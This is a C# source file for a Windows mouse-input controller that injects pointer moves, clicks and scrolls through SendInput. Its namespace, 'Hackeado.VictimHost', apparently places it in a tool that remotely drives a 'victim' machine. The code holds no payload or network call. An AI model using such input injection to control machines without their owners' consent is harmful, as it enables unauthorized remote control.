using System.Runtime.InteropServices;

namespace Hackeado.VictimHost.Input;

public sealed class PointerController
{
    private readonly CoordinateMapper _mapper;
    private readonly HashSet<string> _pressed = new(StringComparer.Ordinal);

    public PointerController(CoordinateMapper mapper) => _mapper = mapper;

    public void Move(double x, double y)
    {
        var point = _mapper.Map(x, y, VirtualBounds());
        SendMouse(point.AbsoluteX, point.AbsoluteY, MouseEvent.Move | MouseEvent.Absolute | MouseEvent.VirtualDesk);
    }

    public void Down(double x, double y, string button)
    {
        Move(x, y);
        var flag = DownFlag(button);
        SendMouse(0, 0, flag, ButtonData(button));
        _pressed.Add(button);
    }

    public void Up(double x, double y, string button)
    {
        Move(x, y);
        SendMouse(0, 0, UpFlag(button), ButtonData(button));
        _pressed.Remove(button);
    }

    public void Wheel(double x, double y, double deltaX, double deltaY)
    {
        Move(x, y);
        if (Math.Abs(deltaY) >= 1)
            SendMouse(0, 0, MouseEvent.Wheel, unchecked((uint)-Math.Clamp((int)deltaY, -1200, 1200)));
        if (Math.Abs(deltaX) >= 1)
            SendMouse(0, 0, MouseEvent.HWheel, unchecked((uint)Math.Clamp((int)deltaX, -1200, 1200)));
    }

    public void ReleaseAll()
    {
        foreach (var button in _pressed.ToArray())
            SendMouse(0, 0, UpFlag(button), ButtonData(button));
        _pressed.Clear();
    }

    private static ScreenBounds VirtualBounds() => new(
        GetSystemMetrics(76),
        GetSystemMetrics(77),
        GetSystemMetrics(78),
        GetSystemMetrics(79));

    private static MouseEvent DownFlag(string button) => button switch
    {
        "left" => MouseEvent.LeftDown,
        "right" => MouseEvent.RightDown,
        "middle" => MouseEvent.MiddleDown,
        "back" or "forward" => MouseEvent.XDown,
        _ => throw new InvalidOperationException("pointer_button_invalid")
    };

    private static MouseEvent UpFlag(string button) => button switch
    {
        "left" => MouseEvent.LeftUp,
        "right" => MouseEvent.RightUp,
        "middle" => MouseEvent.MiddleUp,
        "back" or "forward" => MouseEvent.XUp,
        _ => throw new InvalidOperationException("pointer_button_invalid")
    };

    private static uint ButtonData(string button) => button switch
    {
        "back" => 1,
        "forward" => 2,
        _ => 0
    };

    private static void SendMouse(int dx, int dy, MouseEvent flags, uint mouseData = 0)
    {
        var input = new INPUT
        {
            type = 0,
            union = new InputUnion
            {
                mouse = new MOUSEINPUT
                {
                    dx = dx,
                    dy = dy,
                    mouseData = mouseData,
                    dwFlags = (uint)flags
                }
            }
        };
        if (SendInput(1, [input], Marshal.SizeOf<INPUT>()) != 1)
            throw new InvalidOperationException("send_input_failed");
    }

    [Flags]
    private enum MouseEvent : uint
    {
        Move = 0x0001,
        LeftDown = 0x0002,
        LeftUp = 0x0004,
        RightDown = 0x0008,
        RightUp = 0x0010,
        MiddleDown = 0x0020,
        MiddleUp = 0x0040,
        XDown = 0x0080,
        XUp = 0x0100,
        Wheel = 0x0800,
        HWheel = 0x1000,
        VirtualDesk = 0x4000,
        Absolute = 0x8000
    }

    [StructLayout(LayoutKind.Sequential)]
    private struct INPUT { public uint type; public InputUnion union; }
    [StructLayout(LayoutKind.Explicit)]
    private struct InputUnion { [FieldOffset(0)] public MOUSEINPUT mouse; }
    [StructLayout(LayoutKind.Sequential)]
    private struct MOUSEINPUT
    {
        public int dx;
        public int dy;
        public uint mouseData;
        public uint dwFlags;
        public uint time;
        public nint dwExtraInfo;
    }

    [DllImport("user32.dll", SetLastError = true)]
    private static extern uint SendInput(uint numberOfInputs, INPUT[] inputs, int sizeOfInputStructure);
    [DllImport("user32.dll")]
    private static extern int GetSystemMetrics(int index);
}
